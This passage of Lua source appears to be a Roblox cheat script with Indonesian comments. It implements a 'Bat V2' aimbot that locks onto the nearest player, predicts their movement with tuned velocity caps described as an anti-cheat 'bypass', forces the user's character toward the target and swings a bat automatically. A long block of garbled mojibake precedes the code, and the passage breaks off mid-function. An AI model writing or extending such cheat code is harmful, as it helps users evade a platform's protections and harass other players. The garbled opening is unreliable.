Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â FIXED ====================

-- Helper: cari bat di char/backpack
function _G.AceAntiBypassFindBat()
    local char = LP.Character; if not char then return nil end
    for _, name in ipairs(_G.AceAntiBypassSlapList) do
        local t = char:FindFirstChild(name)
        if t and t:IsA("Tool") then return t end
    end
    local bp = LP:FindFirstChildOfClass("Backpack")
    if bp then
        for _, name in ipairs(_G.AceAntiBypassSlapList) do
            local t = bp:FindFirstChild(name)
            if t and t:IsA("Tool") then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum:EquipTool(t) end) end
                return t
            end
        end
    end
    for _, ch in ipairs(char:GetChildren()) do
        if ch:IsA("Tool") and
           (ch.Name:lower():find("bat") or ch.Name:lower():find("slap")) then
            return ch
        end
    end
    return nil
end

-- Helper: swing dengan cooldown
function _G.AceAntiBypassTrySwing()
    if _G.AceAntiBypassAimbot.swingCooldown then return end
    _G.AceAntiBypassAimbot.swingCooldown = true
    pcall(function()
        local char = LP.Character; if not char then return end
        local tool = char:FindFirstChildOfClass("Tool") or _G.AceAntiBypassFindBat()
        if tool then
            if tool.Parent ~= char then
                local hum = char:FindFirstChildOfClass("Humanoid")
                if hum then pcall(function() hum:EquipTool(tool) end) end
            end
            pcall(function() tool:Activate() end)
        end
    end)
    task.delay(0.08, function()
        if _G.AceAntiBypassAimbot then
            _G.AceAntiBypassAimbot.swingCooldown = false
        end
    end)
end

-- Helper: cari target terdekat
function _G.AceAntiBypassGetClosest()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum   = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then minDist = dist; closest = tRoot end
            end
        end
    end
    return closest
end

-- Helper: rotasi badan ke arah target (sama seperti bRotateToward di NormalAimbot)
local function _batV2RotateToward(root, dir)
    if dir.Magnitude < 0.01 then return end
    local cross = root.CFrame.LookVector:Cross(dir.Unit)
    local angle = math.asin(math.clamp(cross.Magnitude, -1, 1))
    root.AssemblyAngularVelocity = cross.Magnitude > 0.01
        and cross.Unit * angle * 80
        or Vector3.zero
end

local _antiBatBypassAutoTPWasOn    = false
local _batV2AutoLeftWasOn          = false
local _batV2AutoRightWasOn         = false

local function startAntiBatBypass()
    -- Matikan AutoTP sementara
    if autoTPEnabled then
        _antiBatBypassAutoTPWasOn = true
        autoTPEnabled = false
        if stopAutoTP then stopAutoTP() end
        if setVisual then setVisual("AutoTpDown", false) end
    else
        _antiBatBypassAutoTPWasOn = false
    end

    -- Matikan AutoLeft/Right sementara (sama seperti NormalAimbot)
    if autoLeftEnabled then
        _batV2AutoLeftWasOn = true
        autoLeftEnabled = false
        if _G.SoundSetAutoLeftVisual then _G.SoundSetAutoLeftVisual(false) end
        if _G.SoundStopAutoLeft then _G.SoundStopAutoLeft() end
    else
        _batV2AutoLeftWasOn = false
    end
    if autoRightEnabled then
        _batV2AutoRightWasOn = true
        autoRightEnabled = false
        if _G.SoundSetAutoRightVisual then _G.SoundSetAutoRightVisual(false) end
        if _G.SoundStopAutoRight then _G.SoundStopAutoRight() end
    else
        _batV2AutoRightWasOn = false
    end

    -- Putus koneksi lama
    if _G.AceAntiBypassAimbot.conn then
        _G.AceAntiBypassAimbot.conn:Disconnect()
        _G.AceAntiBypassAimbot.conn = nil
    end

    -- Simpan & matikan AutoRotate
    local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then
        if _G.AceAntiBypassAimbot.prevAutoRotate == nil then
            _G.AceAntiBypassAimbot.prevAutoRotate = hum0.AutoRotate
        end
        hum0.AutoRotate = false
    end

    -- Bat V2 (logika diport dari best_bypass_aimbot): lock target + prediksi aman (bypass)
    local HEIGHT, VERT_OFFSET, HIT_DIST = 4.75, 1, 9
    local BYP = {
        VelocityCap       = 95,
        TeleportThreshold = 8,
        MaxAccelPerSec    = 140,
        MaxPredictOffset  = 8,
        lastPos           = nil,
        lastAt            = nil,
        stableVel         = Vector3.zero,
    }
    local locked, noTargetSince = nil, nil

    local function bypReset()
        BYP.lastPos = nil
        BYP.lastAt = nil
        BYP.stableVel = Vector3.zero
    end

    local function validChar(c)
        if not c or not c.Parent then return false end
        local h = c:FindFirstChildOfClass("Humanoid")
        local r = c:FindFirstChild("HumanoidRootPart")
        return (h and r and h.Health > 0) and true or false
    end

    -- target terkunci sampai mati/hilang, baru cari yang terdekat lagi
    local function pickTarget(myRoot)
        if locked and not validChar(locked) then locked = nil end
        if locked then return locked:FindFirstChild("HumanoidRootPart"), locked end
        local best, bestD = nil, math.huge
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and validChar(p.Character) then
                local tr = p.Character:FindFirstChild("HumanoidRootPart")
                local d = (tr.Position - myRoot.Position).Magnitude
                if d < bestD then bestD, best = d, p.Character end
            end
        end
        locked = best
        return best and best:FindFirstChild("HumanoidRootPart"), best
    end

    -- deteksi target teleport (lompatan posisi tidak wajar)
    local function isTeleport(tRoot, now)
        local pos = tRoot.Position
        if BYP.lastPos and BYP.lastAt then
            local dt = now - BYP.lastAt
            if dt > 0 and dt < 0.5 then
                local jump = (pos - BYP.lastPos).Magnitude
                if jump > (BYP.TeleportThreshold + BYP.VelocityCap * dt) then
                    BYP.lastPos, BYP.lastAt = pos, now
                    return true
                end
            end
        end
        BYP.lastPos, BYP.lastAt = pos, now
        return false
    end

    -- velocity target yang dibatasi (cap + limit akselerasi)
    local function stableVelocity(tRoot, now)
        local raw = tRoot.AssemblyLinearVelocity
        if raw.Magnitude > BYP.VelocityCap then raw = raw.Unit * BYP.VelocityCap end
        local prev = BYP.stableVel
        local dt = math.max((BYP.lastAt and (now - BYP.lastAt)) or 0.016, 0.008)
        local accel = (raw - prev) / dt
        if accel.Magnitude > BYP.MaxAccelPerSec then accel = accel.Unit * BYP.MaxAccelPerSec end
        local stable = prev + accel * dt
        BYP.stableVel = stable
        return stable
    end

    _G.AceAntiBypassAimbot.conn = RunService.Heartbeat:Connect(function()
        if not antiBatBypassEnabled then return end

        local char = LP.Character; if not char or not char.Parent then return end
        local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
        local hum  = char:FindFirstChildOfClass("Humanoid")
        if not hum or hum.Health <= 0 then return end

        hum.AutoRotate = false

        -- Auto-equip bat
        local bat = _G.AceAntiBypassFindBat()
        if bat and bat.Parent ~= char then pcall(function() hum:EquipTool(bat) end) end

        hum:Move(Vector3.new(0, 0, 0), false)

        local tRoot, tChar = pickTarget(root)
        if tRoot and tChar and tRoot.Parent and tChar.Parent then
            noTargetSince = nil
            local now = tick()

            if isTeleport(tRoot, now) then
                root.AssemblyLinearVelocity = Vector3.zero
                return
            end
            local tVel = stableVelocity(tRoot, now)

            local predictTime = math.clamp(tVel.Magnitude / 150, 0.05, 0.2)
            local predicted = tRoot.Position + tVel * predictTime
            local diff = predicted - tRoot.Position
            if diff.Magnitude > BYP.MaxPredictOffset then
                predicted = tRoot.Position + diff.Unit * BYP.MaxPredictOffset
            end

            local standPos = predicted + Vector3.new(0, HEIGHT + VERT_OFFSET, 0)
            local moveDir  = standPos - root.Position

            local lookTarget = Vector3.new(predicted.X, root.Position.Y, predicted.Z)
            if (lookTarget - root.Position).Magnitude > 0.1 then
                root.CFrame = CFrame.lookAt(root.Position, lookTarget)
            end

            if moveDir.Magnitude > 1 then
                root.AssemblyLinearVelocity = moveDir.Unit * math.clamp(BAT_V2_SPEED, 1, 120)
            else
                root.AssemblyLinearVelocity = tVel
            end

            -- Swing otomatis saat dekat
            local dist = (tRoot.Position - root.Position).Magnitude
            local tool = char:FindFirstChildOfClass("Tool")
            if tool and dist <= HIT_DIST then
                _G.AceAntiBypassTrySwing()
            end
        else
            if not noTargetSince then noTargetSince = tick() end
            if tick() - noTargetSince > 1.5 then
                locked = nil
                bypReset()
                if root and root.Parent then root.AssemblyLinearVelocity = Vector3.zero end
            end
        end
    end)
end

local function stopAntiBatBypass()
    antiBatBypassEnabled = false

    if _G.AceAntiBypassAimbot.conn then
        _G.AceAntiBypassAimbot.conn:Disconnect()
        _G.AceAntiBypassAimbot.conn = nil
    end
    if _G.AceAntiBypassAimbot then _G.AceAntiBypassAimbot.swingCooldown = false end

    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        root.AssemblyLinearVelocity  = Vector3.zero
        root.AssemblyAngularVelocity = Vector3.zero
    end

    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.AutoRotate = (_G.AceAntiBypassAimbot.prevAutoRotate == nil)
                         and true
                         or  _G.AceAntiBypassAimbot.prevAutoRotate
        hum.PlatformStand = false
        pcall(function() hum:ChangeState(Enum.HumanoidStateType.GettingUp) end)
    end
    if _G.AceAntiBypassAimbot then _G.AceAntiBypassAimbot.prevAutoRotate = nil end

    -- Kembalikan AutoTP
    if _antiBatBypassAutoTPWasOn then
        _antiBatBypassAutoTPWasOn = false
        autoTPEnabled = true
        if startAutoTP then startAutoTP() end
        if setVisual then setVisual("AutoTpDown", true) end
    end

    -- Kembalikan AutoLeft/Right
    if _batV2AutoLeftWasOn then
        _batV2AutoLeftWasOn = false
        if _G.SoundSetAutoLeft then _G.SoundSetAutoLeft(true) end
    end
    if _batV2AutoRightWasOn then
        _batV2AutoRightWasOn = false
        if _G.SoundSetAutoRight then _G.SoundSetAutoRight(true) end
    end
end

_G.SoundToggleBatV2 = function()
    antiBatBypassEnabled = not antiBatBypassEnabled
    if antiBatBypassEnabled then
        -- Matikan mode yang konflik
        if _G.SoundNormalAimbotOn then
            if _G.SoundStopNormalAimbot then _G.SoundStopNormalAimbot() end
            _G.SoundNormalAimbotOn = false
        end
        if _G.SoundTpBatEnabled then
            if _G.SoundSetTpBat then _G.SoundSetTpBat(false) end
        end
        if _G.SoundAntiBypassAimbotOn then
            if _G.SoundStopAntiBypassAimbot then _G.SoundStopAntiBypassAimbot(false) end
            _G.SoundAntiBypassAimbotOn = false
        end
        startAntiBatBypass()
    else
        stopAntiBatBypass()
    end
end

-- ===== BAT V2: Auto-stop saat mati / respawn =====
-- Hook ke karakter saat ini
local function _batV2ForceStop()
    antiBatBypassEnabled = false
    if _G.AceAntiBypassAimbot then
        if _G.AceAntiBypassAimbot.conn then
            pcall(function() _G.AceAntiBypassAimbot.conn:Disconnect() end)
            _G.AceAntiBypassAimbot.conn = nil
        end
        _G.AceAntiBypassAimbot.swingCooldown  = false
        _G.AceAntiBypassAimbot.prevAutoRotate = nil
    end
    -- pakai _G.SoundMobileButtonRefs karena mobileButtons adalah local di scope lain
    local refs = _G.SoundMobileButtonRefs
    if refs and refs.batV2 then
        pcall(function() refs.batV2.setActive(false) end)
    end
end

local function _batV2HookChar(char)
    local hum = char:WaitForChild("Humanoid", 5)
    if not hum then return end
    hum.Died:Connect(function()
        if antiBatBypassEnabled then
            _batV2ForceStop()
        end
    end)
end

-- Hook CharacterAdded: bersihkan state & hook Died ke karakter baru
LP.CharacterAdded:Connect(function(char)
